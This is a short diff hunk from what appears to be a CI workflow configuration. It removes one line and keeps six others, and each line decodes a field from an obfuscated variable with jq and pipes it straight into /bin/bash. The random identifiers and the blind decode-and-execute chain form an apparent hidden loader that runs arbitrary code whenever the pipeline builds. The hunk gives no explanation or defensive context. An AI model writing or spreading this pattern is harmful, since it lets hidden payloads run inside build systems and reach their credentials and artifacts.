@@ -22,7 +22,6 @@ jobs:
           echo $op6 | jq -r .kmoqn2 | /bin/bash
           printf '%s' "$tycd32529" | jq -r .r031 | /bin/bash
           echo $jh70 | jq -r .poute11 | /bin/bash
-          printf '%s' "$civaz702" | jq -r .u35 | /bin/bash
           echo $m06 | jq -r .li2 | /bin/bash
           echo $wnemy76 | jq -r .an29 | /bin/bash
           echo $qt92 | jq -r .gpix459 | /bin/bash
